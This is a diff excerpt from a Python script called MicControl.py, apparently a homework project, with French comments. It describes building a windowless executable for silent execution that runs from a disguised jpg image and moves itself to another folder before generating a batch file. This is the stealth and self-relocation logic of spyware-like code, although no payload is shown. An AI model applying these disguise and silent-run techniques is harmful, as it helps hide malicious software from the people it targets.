@@ -16,16 +16,17 @@ import shutil
     # pyinstaller --onefile -w C:/..../MicControl.py
     #EXPLICATION DES ARG:
     # --onefile permet d'avoir tout dans un seul fichier .exe
-    # -w permet de ne peut avoir de console lors de l'exe === ce qui permettera une execution silencieuse
+    # -w permet de ne peut avoir de console lors de l'exe === ce qui permettera une execusion silencieuse
 
 #***********************************************************************************************************************
 
 
 #je verifie le path de l'excutable (MicControl.exe)
-#Si il est s'execute a partir de l'image jpg dans ce cas il cree une copie dans un autre path
-#SINON on fait rien
-if os.path.dirname(sys.executable) != 'C:/Users/DELL/PycharmProjects/HomeWorkOS/venv/Scripts/dist': #Ces path sont juste pour le test
-    shutil.move(sys.executable, "C:/Users/DELL/PycharmProjects/HomeWorkOS/venv/Scripts/dist")
+#Si il s'execute a partir de l'image jpg dans ce cas il cree une copie dans un autre path
+#SINON il fait rien
+
+if os.path.dirname(sys.executable) != os.path.normpath("C:/Users/DELL/PycharmProjects/HomeWorkOS/venv/Scripts/dist"): #Ces path sont juste pour le test
+    shutil.move(sys.executable, "C:/Users/DELL/PycharmProjects/HomeWorkOS/venv/Scripts/dist/")
     print("loctaion changed")
 
 #La fct qui permet de generer le batch file (.bat)
